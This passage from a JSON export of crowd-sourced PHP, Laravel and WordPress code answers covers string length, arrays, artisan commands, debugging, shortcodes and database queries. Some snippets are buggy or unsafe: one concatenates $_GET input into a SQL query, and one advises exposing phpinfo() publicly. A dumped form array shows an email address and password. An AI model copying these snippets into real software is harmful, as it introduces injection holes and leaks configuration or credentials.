    "id": 1573,
    "keyword": null,
    "link": null,
    "title": " how to count string characters in php",
    "description": "<?php //you can use the substr_count function $str = \"this is a test string\";   echo substr_count($str, \"s\");  //Output: 4 ?>\n<?php $str1 = 'Hello world!'; echo strlen($str1); // Outputs: 12\n",
    "reg_date": "2021-10-12T10:14:43.000Z"
  },
  {
    "id": 1574,
    "keyword": null,
    "link": null,
    "title": " how to count the characters in laravel",
    "description": " <?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>  \n",
    "reg_date": "2021-10-12T10:14:43.000Z"
  },
  {
    "id": 1575,
    "keyword": null,
    "link": null,
    "title": " how to create a logfile in php?",
    "description": "<?php //Something to write to txt log $log  = \"User: \".$_SERVER['REMOTE_ADDR'].' - '.date(\"F j, Y, g:i a\").PHP_EOL.         \"Attempt: \".($result[0]['success']=='1'?'Success':'Failed').PHP_EOL.         \"User: \".$username.PHP_EOL.         \"-------------------------\".PHP_EOL;  //Save string to log, use FILE_APPEND to append. file_put_contents('./log_'.date(\"j.n.Y\").'.log', $log, FILE_APPEND);\n",
    "reg_date": "2021-10-12T10:14:43.000Z"
  },
  {
    "id": 1576,
    "keyword": null,
    "link": null,
    "title": " how to create a logout button in wordpress",
    "description": "<a href=\"<?php echo wp_logout_url( get_permalink() ); ?>\" title=\"Logout\">Logout</a> \n<?php if (is_user_logged_in()) : ?>     <a href=\"<?php echo wp_logout_url(get_permalink()); ?>\">Logout</a> <?php endif;?>\n",
    "reg_date": "2021-10-12T10:14:44.000Z"
  },
  {
    "id": 1577,
    "keyword": null,
    "link": null,
    "title": " how to create a new component in laravel",
    "description": "php artisan make:component component_name\n",
    "reg_date": "2021-10-12T10:14:44.000Z"
  },
  {
    "id": 1578,
    "keyword": null,
    "link": null,
    "title": " how to create an associative array in php",
    "description": "<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Samy'] . \" years old.\";  ?>\n<?php \t$associativeArray = [         \"carOne\" => \"BMW\",         \"carTwo\" => \"VW\",         \"carThree\" => \"Mercedes\"     ];          echo $associativeArray[\"carTwo\"] . \" Is a german brand\"; ?>\n<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Peter'] . \" years old.\";  ?>\n<?php    /*   there are three type of array   \t1 - Indexed array   */  \t$a = array('a','b','c'); \t$b = ['a','b','c']; \t/*     2 - Associative array     */ \t$c = array(     \t'keyOne'=>'valueOne',       \t'keyTwo'=>'valueTwo'     ); \t$d = [       'keyOne'=>'valueOne',       'keyTwo'=>'valueTwo'     ]; /*     3 - Multidimensional  array     */ \t$c = array(     \t'keyOne'=>array('a','b','c'),       \t'keyTwo'=>array('a'=>'1','b'=>'2')     ); \t$d = [       'keyOne'=>['a','b','c'],       \t'keyTwo'=>['a'=>'1','b'=>'2']     ];   ?>\n<?php \t$array = [ \t\t'key1' => 'foo',   \t\t'key2' => 'bar', \t]; \textract($array); \t \techo $key1; //print foo \techo $key2; //print bar ?>\n<?php $arr = array('fruit' => 'mango', 'vegetable' => 'tomato', 'thing' => 'bag'); echo $arr['fruit']; /*OUTPUT mango*/ ?> \n",
    "reg_date": "2021-10-12T10:14:44.000Z"
  },
  {
    "id": 1579,
    "keyword": null,
    "link": null,
    "title": " how to create associative array in php",
    "description": "<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Samy'] . \" years old.\";  ?>\n<?php \t$associativeArray = [         \"carOne\" => \"BMW\",         \"carTwo\" => \"VW\",         \"carThree\" => \"Mercedes\"     ];          echo $associativeArray[\"carTwo\"] . \" Is a german brand\"; ?>\n<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Peter'] . \" years old.\";  ?>\n<?php    /*   there are three type of array   \t1 - Indexed array   */  \t$a = array('a','b','c'); \t$b = ['a','b','c']; \t/*     2 - Associative array     */ \t$c = array(     \t'keyOne'=>'valueOne',       \t'keyTwo'=>'valueTwo'     ); \t$d = [       'keyOne'=>'valueOne',       'keyTwo'=>'valueTwo'     ]; /*     3 - Multidimensional  array     */ \t$c = array(     \t'keyOne'=>array('a','b','c'),       \t'keyTwo'=>array('a'=>'1','b'=>'2')     ); \t$d = [       'keyOne'=>['a','b','c'],       \t'keyTwo'=>['a'=>'1','b'=>'2']     ];   ?>\n// Associative Array in PHP  /******** ARRAY TYPES  ************************************************ There are basically 03 Types of array in php   1. Indexed arrays          => Arrays with a numeric index 2. Associative arrays      => Arrays with named keys 3. Multidimensional arrays => Arrays containing one or more arrays ***********************************************************************/  //EXAMPLE //This is the second one - Associative arrays  $age = array(\"Peter\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Peter'] . \" years old.\";\nArray (     [email] => abeermanchanda00@gmail.com     [password1] => chess     [passcheck1] => on     [submit] => Login ) \n",
    "reg_date": "2021-10-12T10:14:44.000Z"
  },
  {
    "id": 1580,
    "keyword": null,
    "link": null,
    "title": " how to create comments in php",
    "description": "// This is a single-line comment  # This is also a single-line comment  /* This is a multiple-lines comment block that spans over multiple lines */\n Answer: Use the Syntax \"// text\" (single line) and \"/* text */\" (multi-line)\n// single line comment /* multi line comment hello */\n",
    "reg_date": "2021-10-12T10:14:44.000Z"
  },
  {
    "id": 1581,
    "keyword": null,
    "link": null,
    "title": " how to create controler in laravel",
    "description": "php artisan make:controller controller_name   \n",
    "reg_date": "2021-10-12T10:14:44.000Z"
  },
  {
    "id": 1582,
    "keyword": null,
    "link": null,
    "title": " how to create controller in laravel",
    "description": "php artisan make:controller MyController\nphp artisan make:controller UserController\nphp artisan make:controller ShowProfile\nphp artisan make:controller MyController php artisan make:controller CompanyController --resource //To create with a Model php artisan make:controller CompanyController --resource --model=CompanyModel \nphp artisan make:controller NameController // if you want to auto setup then use: NameContrller -r  \nSimple controller: php artisan make:controller nameOfController      Want to create controller in a folder? use it like this: php artisan make:controller NameOfFolder/nameOfController      Resource Controller:This controller will create all CRUD methods php artisan make:controller nameOfController --resource\n",
    "reg_date": "2021-10-12T10:14:44.000Z"
  },
  {
    "id": 1583,
    "keyword": null,
    "link": null,
    "title": " how to create controller in specific folder laravel",
    "description": "php artisan make:controller frontend/HomePageController --resource\nphp artisan make:controller App\\\\pathName/controllerName\nWant to create controller in a folder? use it like this:  php artisan make:controller NameOfFolder/nameOfController  \n",
    "reg_date": "2021-10-12T10:14:44.000Z"
  },
  {
    "id": 1584,
    "keyword": null,
    "link": null,
    "title": " how to create controller inside folder in laravel",
    "description": "php artisan make:controller subfolder/SomeController \nphp artisan make:controller frontend/HomePageController --resource\nphp artisan make:controller App\\\\pathName/controllerName\nWant to create controller in a folder? use it like this:  php artisan make:controller NameOfFolder/nameOfController  \n",
    "reg_date": "2021-10-12T10:14:44.000Z"
  },
  {
    "id": 1585,
    "keyword": null,
    "link": null,
    "title": " how to create model in laravel",
    "description": "# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:model Flight\nphp artisan make:model ModelName\nphp artisan make:model Flight --factory php artisan make:model Flight -f  php artisan make:model Flight --seed php artisan make:model Flight -s  php artisan make:model Flight --controller php artisan make:model Flight -c  php artisan make:model Flight -mfsc\n$user = User::create([     'first_name' => 'Taylor',     'last_name' => 'Otwell',     'title' => 'Developer', ]);  $user->title = 'Painter';  $user->isDirty(); // true $user->isDirty('title'); // true $user->isDirty('first_name'); // false  $user->isClean(); // false $user->isClean('title'); // false $user->isClean('first_name'); // true  $user->save();  $user->isDirty(); // false $user->isClean(); // true\n",
    "reg_date": "2021-10-12T10:14:45.000Z"
  },
  {
    "id": 1586,
    "keyword": null,
    "link": null,
    "title": " how to create new array in php",
    "description": "$array = array(     \"foo\" => \"bar\",     \"bar\" => \"foo\", );\n$array = array(     \"foo\" => \"bar\",     \"bar\" => \"foo\", ); \n",
    "reg_date": "2021-10-12T10:14:45.000Z"
  },
  {
    "id": 1587,
    "keyword": null,
    "link": null,
    "title": " how to create object in php wihtout class",
    "description": "//You can use stdClass which is sort of empty template    $object = new stdClass();  //Assign property $object->property = 'Here we go';  //Now if we dump it  var_dump($object);    /*    outputs:    object(stdClass)#2 (1) {       [\"property\"]=>       string(10) \"Here we go\"     }    */ //Even shorter $object = (object) ['property' => 'Here we go'];\n",
    "reg_date": "2021-10-12T10:14:45.000Z"
  },
  {
    "id": 1588,
    "keyword": null,
    "link": null,
    "title": " how to create random alphanumeric in php",
    "description": "<?php  // online code for creating alphanumeric in php  // this will generate 6 charactor, you can create as many just change the 6 from code $pass = substr(str_shuffle(\"0123456789abcdefghijklmnopqrstvwxyz\"), 0, 6); echo $pass;  //output : 17w2y8 ?>\nfunction generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\n",
    "reg_date": "2021-10-12T10:14:45.000Z"
  },
  {
    "id": 1589,
    "keyword": null,
    "link": null,
    "title": " how to create shortcode",
    "description": "// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode'); \n<?php function abc() {} ////create shortcode//// add_shortcode('page_name','abc'); ?>\n",
    "reg_date": "2021-10-12T10:14:45.000Z"
  },
  {
    "id": 1590,
    "keyword": null,
    "link": null,
    "title": " how to create shortcode with php",
    "description": "$childrens = do_shortcode( '[products ids=\"'. $string . '\"]' ); \n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode');  \n",
    "reg_date": "2021-10-12T10:14:45.000Z"
  },
  {
    "id": 1591,
    "keyword": null,
    "link": null,
    "title": " how to create user & pass on php admin?",
    "description": "Login to phpMyAdmin Go To User Accounts Click on Add User account Enter your desired ID & Pass  \n",
    "reg_date": "2021-10-12T10:14:45.000Z"
  },
  {
    "id": 1592,
    "keyword": null,
    "link": null,
    "title": " how to create wordpress shortcodes",
    "description": "function create_shortcode(){     return \"<h2>Hello world !</h2>\"; } add_shortcode('my_shortcode', 'create_shortcode'); // Use [my_shortcode]\nfunction wp_demo_shortcode() {   //Turn on output buffering ob_start(); $code = 'Hello World'; ob_get_clean();   // Output needs to be return return $code; }   // register shortcode add_shortcode('helloworld', 'wp_demo_shortcode'); \n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode'); \n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode');  \n",
    "reg_date": "2021-10-12T10:14:45.000Z"
  },
  {
    "id": 1593,
    "keyword": null,
    "link": null,
    "title": " how to debug in php",
    "description": "phpinfo();\nini_set('display_errors', 'On'); error_reporting(E_ALL);\n<?php $myVar = \"hello world!\";  var_dump($myVar); print_r($myVar);  $allVars = get_defined_vars(); print_r($allVars); debug_zval_dump($allVars);  function sayHello($hello) {     echo $hello;     debug_print_backtrace(); }  sayHello($myVar); ?>\n// ------ string ------- // use echo, exit for output $a = 123 echo ($a); exit;   // ------ array ------- $array = array( \t1 => 'apple',   \t2 => 'banana', )  // Method 1 echo \"<pre>\"; print_r($array); echo \"</pre>\";  // Method 2  echo \"<pre>\"; var_dump($array); echo \"</pre>\";  // Method 3 (no need exit) beacause of dd is already exit dd($array)    // Method 4 (cakephp) pr ($array);   // ------ json ------- $json = {\"a\":\"123\"}  pr (json_encode($json)); exit;  print_r (json_encode($json)); exit;\n",
    "reg_date": "2021-10-12T10:14:45.000Z"
  },
  {
    "id": 1594,
    "keyword": null,
    "link": null,
    "title": " how to debug in wordpress",
    "description": "// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );  // Use dev versions of core JS and CSS files (only needed if you are modifying these core files) define( 'SCRIPT_DEBUG', true );\n// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );\n// This enables debugging. define( 'WP_DEBUG', true );\n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1595,
    "keyword": null,
    "link": null,
    "title": " how to debug php",
    "description": "phpinfo();\nini_set('display_errors', 'On'); error_reporting(E_ALL);\n// ------ string ------- // use echo, exit for output $a = 123 echo ($a); exit;   // ------ array ------- $array = array( \t1 => 'apple',   \t2 => 'banana', )  // Method 1 echo \"<pre>\"; print_r($array); echo \"</pre>\";  // Method 2  echo \"<pre>\"; var_dump($array); echo \"</pre>\";  // Method 3 (no need exit) beacause of dd is already exit dd($array)    // Method 4 (cakephp) pr ($array);   // ------ json ------- $json = {\"a\":\"123\"}  pr (json_encode($json)); exit;  print_r (json_encode($json)); exit;\n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1596,
    "keyword": null,
    "link": null,
    "title": " how to debug the curl request",
    "description": "curl_setopt($curlhandle, CURLOPT_VERBOSE, true);\n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1597,
    "keyword": null,
    "link": null,
    "title": " how to define function in php",
    "description": "<?php function writeMsg() {     echo \"Hello world!\"; }  writeMsg(); //call the function ?>\nfunction functionName() {     //code to be executed; }\nfunction functionName() {     //code to be executed; } functionName();\n<html>        <head>       <title>Writing PHP Function with Parameters</title>    </head>        <body>           <?php          function addFunction($num1, $num2) {             $sum = $num1 + $num2;             echo \"Sum of the two numbers is : $sum\";          }                    addFunction(10, 20);       ?>           </body> </html>\n#functions  <?php     #function - a block of code that can be repeatedly called      /*     How to format functions     1. Camel Case myFunction()     2.Lower case with underscore my_function()     3. Pascal Cae - MyFunction() usally used with classes     */     function simpleFunction(){         echo 'Hello John';      }     //Run the function like so     simpleFunction();      //function with param     function sayHello($name = \" you out there!\"){         echo \"<br>and<br> Hello $name<br>\";     }     sayHello('John');     sayHello();      //Reurn Value     function addNumbers($num1, $num2){         return $num1 + $num2;      }      echo addNumbers(2,3);       // By Reference       $myNum = 10;       function addFive($num){          $num += 5;      }       function addTen(&$num) {          $num += 10;      }       addFive($myNum);      echo \"<br>Value: $myNum<br>\";       addTen($myNum);      echo \"Value: $myNum<br>\";   ?>\n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1598,
    "keyword": null,
    "link": null,
    "title": " how to delete a file in laravel",
    "description": " $destinationPath = 'your_path';  File::delete($destinationPath.'/your_file');\n// Delete a single file File::delete($filename);  // Delete multiple files File::delete($file1, $file2, $file3);  // Delete an array of files $files = array($file1, $file2); File::delete($files);  //And don't forget to add at the top: use Illuminate\\Support\\Facades\\File; \n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1599,
    "keyword": null,
    "link": null,
    "title": " how to delete all products woocommerce in phpmyadmin",
    "description": "DELETE relations.*, taxes.*, terms.* FROM wp_term_relationships AS relations INNER JOIN wp_term_taxonomy AS taxes ON relations.term_taxonomy_id=taxes.term_taxonomy_id INNER JOIN wp_terms AS terms ON taxes.term_id=terms.term_id WHERE object_id IN (SELECT ID FROM wp_posts WHERE post_type='product');    DELETE FROM wp_postmeta WHERE post_id IN (SELECT ID FROM wp_posts WHERE post_type = 'product'); DELETE FROM wp_posts WHERE post_type = 'product'; \n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1600,
    "keyword": null,
    "link": null,
    "title": " how to detect intial domain using php\\",
    "description": "$_SERVER['REQUEST_URI'] \n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1601,
    "keyword": null,
    "link": null,
    "title": " how to display data from mysql database into html table using php",
    "description": "<?php $con=mysqli_connect(\"example.com\",\"peter\",\"abc123\",\"my_db\"); // Check connection if (mysqli_connect_errno()) { echo \"Failed to connect to MySQL: \" . mysqli_connect_error(); }  $result = mysqli_query($con,\"SELECT * FROM Persons\");  echo \"<table border='1'> <tr> <th>Firstname</th> <th>Lastname</th> </tr>\";  while($row = mysqli_fetch_array($result)) { echo \"<tr>\"; echo \"<td>\" . $row['FirstName'] . \"</td>\"; echo \"<td>\" . $row['LastName'] . \"</td>\"; echo \"</tr>\"; } echo \"</table>\";  mysqli_close($con); ?> \n<?php $host    = \"localhost\"; $user    = \"username_here\"; $pass    = \"password_here\"; $db_name = \"database_name_here\";  //create connection $connection = mysqli_connect($host, $user, $pass, $db_name);  //test if connection failed if(mysqli_connect_errno()){     die(\"connection failed: \"         . mysqli_connect_error()         . \" (\" . mysqli_connect_errno()         . \")\"); }  //get results from database $result = mysqli_query($connection,\"SELECT * FROM products\"); $all_property = array();  //declare an array for saving property  //showing property echo '<table class=\"data-table\">         <tr class=\"data-heading\">';  //initialize table tag while ($property = mysqli_fetch_field($result)) {     echo '<td>' . $property->name . '</td>';  //get field name for header     array_push($all_property, $property->name);  //save those to array } echo '</tr>'; //end tr tag  //showing all data while ($row = mysqli_fetch_array($result)) {     echo \"<tr>\";     foreach ($all_property as $item) {         echo '<td>' . $row[$item] . '</td>'; //get items using property value     }     echo '</tr>'; } echo \"</table>\"; ?> \n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1602,
    "keyword": null,
    "link": null,
    "title": " how to display the responce of curl in php",
    "description": "$response = get_web_page(\"http://socialmention.com/search?q=iphone+apps&f=json&t=microblogs&lang=fr\"); $resArr = array(); $resArr = json_decode($response); echo \"<pre>\"; print_r($resArr); echo \"</pre>\";  function get_web_page($url) {     $options = array(         CURLOPT_RETURNTRANSFER => true,   // return web page         CURLOPT_HEADER         => false,  // don't return headers         CURLOPT_FOLLOWLOCATION => true,   // follow redirects         CURLOPT_MAXREDIRS      => 10,     // stop after 10 redirects         CURLOPT_ENCODING       => \"\",     // handle compressed         CURLOPT_USERAGENT      => \"test\", // name of client         CURLOPT_AUTOREFERER    => true,   // set referrer on redirect         CURLOPT_CONNECTTIMEOUT => 120,    // time-out on connect         CURLOPT_TIMEOUT        => 120,    // time-out on response     );       $ch = curl_init($url);     curl_setopt_array($ch, $options);      $content  = curl_exec($ch);      curl_close($ch);      return $content; }\n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1603,
    "keyword": null,
    "link": null,
    "title": " how to display the site tagline in wordpress",
    "description": "<?php bloginfo( &lsquo;description&rsquo; ); ?>\n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1604,
    "keyword": null,
    "link": null,
    "title": " how to display user id from a function on a wordpress page",
    "description": "function get_current_user_id() {     if ( ! function_exists( 'wp_get_current_user' ) ) {         return 0;     }     $user = wp_get_current_user();     return ( isset( $user->ID ) ? (int) $user->ID : 0 ); } \n",
    "reg_date": "2021-10-12T10:14:46.000Z"
  },
  {
    "id": 1605,
    "keyword": null,
    "link": null,
    "title": " how to divide in php",
    "description": "$a = $b / $c;\n",
    "reg_date": "2021-10-12T10:14:47.000Z"
  },
  {
    "id": 1606,
    "keyword": null,
    "link": null,
    "title": " how to echo line number in php",
    "description": "echo  __LINE__;\n",
    "reg_date": "2021-10-12T10:14:47.000Z"
  },
  {
    "id": 1607,
    "keyword": null,
    "link": null,
    "title": " how to edit saved data on xampp",
    "description": "//open your table and click on edit and then click update  UPDATE `books` //where books is table name SET `bookid`=newvalue,//write what you want to change and new value `bookname`=newvalue1//write only those value what you want to change  WHERE  bookid='oldvalue' //write any value so that xamp found what row want to chnage //.........OR..........// authorsname='oldvalue' //write any value so that xamp found what row want to chnage           //And press Go\n",
    "reg_date": "2021-10-12T10:14:47.000Z"
  },
  {
    "id": 1608,
    "keyword": null,
    "link": null,
    "title": " how to enable wp debug",
    "description": "// This enables debugging. define( 'WP_DEBUG', true );\n",
    "reg_date": "2021-10-12T10:14:47.000Z"
  },
  {
    "id": 1609,
    "keyword": null,
    "link": null,
    "title": " how to escape html tags in php",
    "description": "/*  EXAMPLE:\t<p>Bed & Breakfast</p>\t-->\t  <p>Bed &amp; Breakfast</p>       & \t&amp;     \" \t&quot; \t\t\t\t(unless ENT_NOQUOTES is set)     ' \t&#039; or &apos; \t(ENT_QUOTES must be set)     < \t&lt;     > \t&gt;\t\t\t\t*/  <?php $new = htmlspecialchars(\"<a href='test'>Test</a>\", ENT_QUOTES); echo $new; \t\t\t\t\t// <a href='test'>Test</a> ?>\n",
    "reg_date": "2021-10-12T10:14:47.000Z"
  },
  {
    "id": 1610,
    "keyword": null,
    "link": null,
    "title": " how to execute cmd command in php",
    "description": "shell_exec('ls'); // or exec('ls');\n I'm not sure what shell you are going to get with this function, but you can find out like this:  <?php $cmd = 'set'; echo \"<pre>\".shell_exec($cmd).\"</pre>\"; ?>  On my FreeBSD 6.1 box I get this:  USER=root LD_LIBRARY_PATH=/usr/local/lib/apache2: HOME=/root PS1='$ ' OPTIND=1 PS2='> ' LOGNAME=root PPID=88057 PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin SHELL=/bin/sh IFS='      '  Very interesting.  Note that the PATH may not be as complete as you need.  I wanted to run Ghostscript via ImageMagik's \"convert\" and ended up having to add my path before running the command:  <?php $cmd = 'export PATH=\"/usr/local/bin/\"; convert -scale 25%x25% file1.pdf[0] file2.png 2>&1'; echo \"<pre>\".shell_exec($cmd).\"</pre>\"; ?>  ALSO, note that shell_exec() does not grab STDERR, so use \"2>&1\" to redirect it to STDOUT and catch it. \nphp php_file.php // or php php_file.php > result_file.txt // to display the result of echoes or dumps\n",
    "reg_date": "2021-10-12T10:14:47.000Z"
  },
  {
    "id": 1611,
    "keyword": null,
    "link": null,
    "title": " how to fetch data from url in php properly",
    "description": "use <?php $_SERVER['REQUEST_URI'] ?> in action\"\" to get the data properly\nAdd action=\"<?php $_SERVER['REQUEST_URI']; ?>\" if you dont know just copy and paste it\nuse <?php echo $_SERVER['REQUEST_URI']; ?> in action\"\" to get the data properly\n",
    "reg_date": "2021-10-12T10:14:47.000Z"
  },
  {
    "id": 1612,
    "keyword": null,
    "link": null,
    "title": " how to fetch data using pdo in php",
    "description": "                                     <?php require_once 'dbconfig.php';  try {     $pdo = new PDO(\"mysql:host=$host;dbname=$dbname\", $username, $password);      $sql = 'SELECT lastname,                     firstname,                     jobtitle                FROM employees               ORDER BY lastname';      $q = $pdo->query($sql);     $q->setFetchMode(PDO::FETCH_ASSOC); } catch (PDOException $e) {     die(\"Could not connect to the database $dbname :\" . $e->getMessage()); } ?> <!DOCTYPE html> <html>     <head>         <title>PHP MySQL Query Data Demo</title>         <link href=\"css/bootstrap.min.css\" rel=\"stylesheet\">         <link href=\"css/style.css\" rel=\"stylesheet\">     </head>     <body>         <div id=\"container\">             <h1>Employees</h1>             <table class=\"table table-bordered table-condensed\">                 <thead>                     <tr>                         <th>First Name</th>                         <th>Last Name</th>                         <th>Job Title</th>                     </tr>                 </thead>                 <tbody>                     <?php while ($row = $q->fetch()): ?>                         <tr>                             <td><?php echo htmlspecialchars($row['lastname']) ?></td>                             <td><?php echo htmlspecialchars($row['firstname']); ?></td>                             <td><?php echo htmlspecialchars($row['jobtitle']); ?></td>                         </tr>                     <?php endwhile; ?>                 </tbody>             </table>     </body> </div> </html>\n$dbhost = @mysql_connect($host, $user, $pass) or die('Unable to connect to server');  @mysql_select_db('divebay') or die('Unable to select database'); $search = $_GET['searchdivebay']; $query = trim($search);  $sql = \"SELECT * FROM auction WHERE name LIKE '%\" . $query . \"%'\";    if(!isset($query)){ echo 'Your search was invalid'; exit; } //line 18  $result = mysql_query($trim); $numrows = mysql_num_rows($result); mysql_close($dbhost);\n$pdo = new PDO('mysql:host=$host; dbname=$database;', $user, $pass); $stmt = $pdo->prepare('SELECT * FROM auction WHERE name = :name'); $stmt->bindParam(':name', $_GET['searchdivebay']); $stmt->execute(array(':name' => $name);\n$stmt = $pdo->prepare(\"SELECT * FROM users LIMIT :limit, :offset\");$stmt->execute(['limit' => $limit, 'offset' => $offset]); $data = $stmt->fetchAll();// and somewhere later:foreach ($data as $row) {    echo $row['name'].\"<br />\\n\";}\n",
    "reg_date": "2021-10-12T10:14:47.000Z"
  },
  {
    "id": 1613,
    "keyword": null,
    "link": null,
    "title": " how to find mysql server name in php",
    "description": "<?php echo $_SERVER['SERVER_NAME']; ?>\n",
    "reg_date": "2021-10-12T10:14:47.000Z"
  },
  {
    "id": 1614,
    "keyword": null,
    "link": null,
    "title": " how to find php.ini",
    "description": "php -i | grep \"Loaded Configuration File\" \nphp --ini\nfor cmd : php --ini    for code : use php_ini_loaded_file() as :=  $inipath = php_ini_loaded_file(); if ($inipath) {     echo 'Loaded php.ini: ' . $inipath; } else {     echo 'A php.ini file is not loaded'; }\nrun: php --ini\nphp -i | grep 'my_value' \n1. Create test.php file with the following content  2. <?php phpinfo(); ?>  3. Put it in the root of the site (or in a public folder)  4. Open the file on your browser \"domaine.com/test.php\"  4. Look for \"Loaded Configuration File\"\n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1615,
    "keyword": null,
    "link": null,
    "title": " how to find the name of login user in laravel",
    "description": "Auth::user()->name\n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1616,
    "keyword": null,
    "link": null,
    "title": " how to fix PHP Fatal error: Allowed memory size of 1610612736 bytes exhausted",
    "description": "export COMPOSER_MEMORY_LIMIT=-1\nphp -d memory_limit=-1 composer.phar require hwi/oauth-bundle php-http/guzzle6-adapter php-http/httplug-bundle \nIn my case with Xampp with Windows 10  i just changed:  ;memory_limit=512M  by commenting this configuration, in php.ini to:  memory_limit =-1 \n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1617,
    "keyword": null,
    "link": null,
    "title": " how to get a whole number from decimal in php",
    "description": "<?php  $number = 23.325;  // english notation (default) $english_format_number = number_format($number);  echo $english_format_number; //Publisher name - Bathila Sanvidu Jayasundara ?>\n$price = 1234.44;  $whole = intval($price); // 1234 $decimal1 = $price - $whole; // 0.44000000000005 uh oh! that's why it needs... (see next line) $decimal2 = round($decimal1, 2); // 0.44 this will round off the excess numbers $decimal = substr($decimal2, 2); // 44 this removed the first 2 characters  if ($decimal == 1) { $decimal = 10; } // Michel's warning is correct... if ($decimal == 2) { $decimal = 20; } // if the price is 1234.10... the decimal will be 1... if ($decimal == 3) { $decimal = 30; } // so make sure to add these rules too if ($decimal == 4) { $decimal = 40; } if ($decimal == 5) { $decimal = 50; } if ($decimal == 6) { $decimal = 60; } if ($decimal == 7) { $decimal = 70; } if ($decimal == 8) { $decimal = 80; } if ($decimal == 9) { $decimal = 90; }  echo 'The dollar amount is ' . $whole . ' and the decimal amount is ' . $decimal;\ntest\n <?php  $number = 1234.56;  // english notation (default) $english_format_number = number_format($number); // 1,235  // French notation $nombre_format_francais = number_format($number, 2, ',', ' '); // 1 234,56  $number = 1234.5678;  // english notation without thousands separator $english_format_number = number_format($number, 2, '.', ''); // 1234.57  ?>  \n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1618,
    "keyword": null,
    "link": null,
    "title": " how to get all roles in wordpress",
    "description": "/* get all role in wordpress in associative key = role(slug) => value(Role Display name) by joshiyogesh0333@gmail.com  */ function get_role_names() {  global $wp_roles;  if ( ! isset( $wp_roles ) )     $wp_roles = new WP_Roles();  return $wp_roles->get_names(); } \nfunction get_role_names() {  global $wp_roles;  if ( ! isset( $wp_roles ) )     $wp_roles = new WP_Roles();  return $wp_roles->get_names(); } \n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1619,
    "keyword": null,
    "link": null,
    "title": " how to get all the records with same ID in laravel",
    "description": "Product::orderBy('id','desc')->where('category_id', 1)->get(); \n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1620,
    "keyword": null,
    "link": null,
    "title": " how to get browser info in php",
